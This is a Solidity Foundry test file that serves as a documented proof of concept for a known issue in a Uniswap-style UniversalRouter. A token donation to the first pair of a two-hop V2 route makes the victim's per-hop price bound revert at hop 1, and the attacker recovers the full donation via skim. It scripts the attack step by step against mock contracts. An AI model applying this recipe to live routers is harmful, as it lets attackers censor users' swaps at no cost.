// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import 'forge-std/Test.sol';
import {UniversalRouter} from '../../contracts/UniversalRouter.sol';
import {V2SwapRouter} from '../../contracts/modules/uniswap/v2/V2SwapRouter.sol';
import {UniswapV2Library} from '../../contracts/modules/uniswap/v2/UniswapV2Library.sol';
import {Commands} from '../../contracts/libraries/Commands.sol';
import {Constants} from '../../contracts/libraries/Constants.sol';
import {RouterParameters} from '../../contracts/types/RouterParameters.sol';
import {MockERC20} from './mock/MockERC20.sol';
import {MockV2Pair, MockV2Factory} from './mock/MockV2Pair.sol';

/// @notice KNOWN ISSUE, documented rather than fixed. Multihop counterpart to V2PerHopDonationPoC.
///
/// The single-hop PoC shows a donation to the swapped pair inflating that hop's price denominator.
/// This file covers the case that decides whether input attribution can fix it: a donation to
/// pair 0 of a two-hop route, with hop 0's bound DISABLED and only hop 1's bound set.
///
/// Hop 0 swaps the donation, so the proceeds physically arrive at pair 1. Hop 1 therefore receives
/// genuinely more input and honestly measures a worse rate. Attributing the victim's share of
/// hop 0's input fixes hop 0 and leaves hop 1 open, and censorship needs only one hop to fail.
///
/// See contracts/modules/uniswap/v2/V2SwapRouter.sol for the deferred-fix note.
contract V2PerHopDonationMultihopTest is Test {
    uint256 constant R0_A = 10_000 ether; // pair0 reserves, A side
    uint256 constant R0_B = 10_000 ether; // pair0 reserves, B side
    uint256 constant R1_B = 10_000 ether; // pair1 reserves, B side
    uint256 constant R1_C = 20_000 ether; // pair1 reserves, C side

    uint256 constant SWAP_IN = 10 ether;
    uint256 constant TOLERANCE_BPS = 50; // 0.50% per-hop tolerance

    address constant VICTIM = address(0x1C71);
    address constant ATTACKER = address(0xA77ACC);
    address constant RECIPIENT = address(0xBEEF);

    UniversalRouter router;
    MockV2Factory factory;
    MockERC20 tokenA;
    MockERC20 tokenB;
    MockERC20 tokenC;
    MockV2Pair pair0; // A/B
    MockV2Pair pair1; // B/C

    function setUp() public {
        tokenA = new MockERC20();
        tokenB = new MockERC20();
        tokenC = new MockERC20();

        factory = new MockV2Factory();
        pair0 = MockV2Pair(factory.createPair(address(tokenA), address(tokenB)));
        pair1 = MockV2Pair(factory.createPair(address(tokenB), address(tokenC)));

        tokenA.mint(address(pair0), R0_A);
        tokenB.mint(address(pair0), R0_B);
        pair0.sync();

        tokenB.mint(address(pair1), R1_B);
        tokenC.mint(address(pair1), R1_C);
        pair1.sync();

        RouterParameters memory params = RouterParameters({
            permit2: address(0xdead),
            weth9: address(0),
            v2Factory: address(factory),
            v3Factory: address(0),
            pairInitCodeHash: factory.pairInitCodeHash(),
            poolInitCodeHash: bytes32(0),
            v4PoolManager: address(0),
            permissionsAdapterFactory: address(0),
            v3NFTPositionManager: address(0),
            v4PositionManager: address(0),
            spokePool: address(0)
        });
        router = new UniversalRouter(params);
    }

    function _path() internal view returns (address[] memory path) {
        path = new address[](3);
        path[0] = address(tokenA);
        path[1] = address(tokenB);
        path[2] = address(tokenC);
    }

    function _trySwap(uint256 amountIn, uint256[] memory hopBounds) internal returns (bool ok, bytes memory ret) {
        tokenA.mint(address(router), amountIn);

        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(RECIPIENT, amountIn, uint256(0), _path(), false, hopBounds);

        vm.prank(VICTIM);
        (ok, ret) = address(router).call(abi.encodeWithSignature('execute(bytes,bytes[])', commands, inputs));
    }

    /// @dev Reserves ordered as (reserveIn, reserveOut) for a directional hop
    function _reserves(MockV2Pair p, address input) internal view returns (uint256 rIn, uint256 rOut) {
        (uint112 r0, uint112 r1,) = p.getReserves();
        (rIn, rOut) = input == p.token0() ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
    }

    /// @dev What hop 1 measures as its input/output when `donation` sits at pair 0 beforehand
    function _hop1Measured(uint256 donation) internal view returns (uint256 hop1In, uint256 hop1Out) {
        (uint256 r0In, uint256 r0Out) = _reserves(pair0, address(tokenA));
        (uint256 r1In, uint256 r1Out) = _reserves(pair1, address(tokenB));
        hop1In = UniswapV2Library.getAmountOut(SWAP_IN + donation, r0In, r0Out);
        hop1Out = UniswapV2Library.getAmountOut(hop1In, r1In, r1Out);
    }

    function _hop1Price(uint256 donation) internal view returns (uint256) {
        (uint256 hop1In, uint256 hop1Out) = _hop1Measured(donation);
        return hop1Out * Constants.PRICE_PRECISION / hop1In;
    }

    /// @dev The hop-1 bound an honest router would compute from a clean quote
    function _honestHop1Bound() internal view returns (uint256) {
        return _hop1Price(0) * (10_000 - TOLERANCE_BPS) / 10_000;
    }

    function _minimalCensoringDonation(uint256 minPrice) internal view returns (uint256) {
        uint256 lo = 0;
        uint256 hi = R0_A;
        require(_hop1Price(hi) < minPrice, 'no donation can censor at these params');
        while (lo < hi) {
            uint256 mid = (lo + hi) / 2;
            if (_hop1Price(mid) < minPrice) hi = mid;
            else lo = mid + 1;
        }
        return lo;
    }

    /// @dev hop 0 disabled, hop 1 bounded -- isolates hop 1 as the failing check
    function _hop1Only(uint256 bound) internal pure returns (uint256[] memory a) {
        a = new uint256[](2);
        a[0] = 0;
        a[1] = bound;
    }

    function _stripSelector(bytes memory data) internal pure returns (bytes memory out) {
        out = new bytes(data.length - 4);
        for (uint256 i; i < out.length; i++) {
            out[i] = data[i + 4];
        }
    }

    function test_baseline_boundedMultihopRouteSucceeds() public {
        (bool ok,) = _trySwap(SWAP_IN, _hop1Only(_honestHop1Bound()));
        assertTrue(ok, 'honest bounded route should succeed');
        assertGt(tokenC.balanceOf(RECIPIENT), 0, 'victim received nothing');
    }

    /// @notice The route is censored at hop 1, whose own pair was never touched. Hop 0's bound is
    /// zero here, so correcting hop 0's denominator could not have prevented this.
    function test_donationToPair0_censorsRouteAtHop1() public {
        uint256 minPrice = _honestHop1Bound();
        uint256 donation = _minimalCensoringDonation(minPrice);

        emit log_named_decimal_uint('victim input                   ', SWAP_IN, 18);
        emit log_named_decimal_uint('minimal donation to pair 0     ', donation, 18);
        emit log_named_uint('  as bps of pair0 input reserve', donation * 10_000 / R0_A);

        (uint256 honestHop1In,) = _hop1Measured(0);
        (uint256 attackedHop1In,) = _hop1Measured(donation);
        emit log_named_decimal_uint('B reaching pair1, honest       ', honestHop1In, 18);
        emit log_named_decimal_uint('B reaching pair1, attacked     ', attackedHop1In, 18);

        tokenA.mint(ATTACKER, donation);
        uint256 attackerStart = tokenA.balanceOf(ATTACKER);

        // tx1: donate to pair 0
        vm.prank(ATTACKER);
        tokenA.transfer(address(pair0), donation);

        // tx2: the victim's route reverts at hop 1
        (bool ok, bytes memory ret) = _trySwap(SWAP_IN, _hop1Only(minPrice));
        assertFalse(ok, 'bounded route should have been censored');
        assertEq(
            bytes4(ret),
            V2SwapRouter.V2TooLittleReceivedPerHop.selector,
            'expected the per-hop bound to be what rejected the route'
        );
        (uint256 hopIndex,,) = abi.decode(_stripSelector(ret), (uint256, uint256, uint256));
        assertEq(hopIndex, 1, 'hop 1 should be the failing hop, not hop 0');
        assertEq(tokenC.balanceOf(RECIPIENT), 0, 'victim route should have been censored');

        // tx3: the donation is still unsynced excess at pair 0, so skim returns it
        pair0.skim(ATTACKER);
        assertEq(tokenA.balanceOf(ATTACKER), attackerStart, 'attacker did not fully recover donation');

        emit log_string('censored at hop 1 and recovered 100% of donated principal');
    }

    /// @dev The donation increases what the route itself delivers to pair 1, so there is nothing
    /// foreign left at hop 1 for an attribution scheme to exclude.
    function test_donationIncreasesFlowThroughPair1() public view {
        uint256 donation = _minimalCensoringDonation(_honestHop1Bound());
        (uint256 honestHop1In,) = _hop1Measured(0);
        (uint256 attackedHop1In,) = _hop1Measured(donation);
        assertGt(attackedHop1In, honestHop1In, 'donation should increase input reaching pair 1');
    }
}
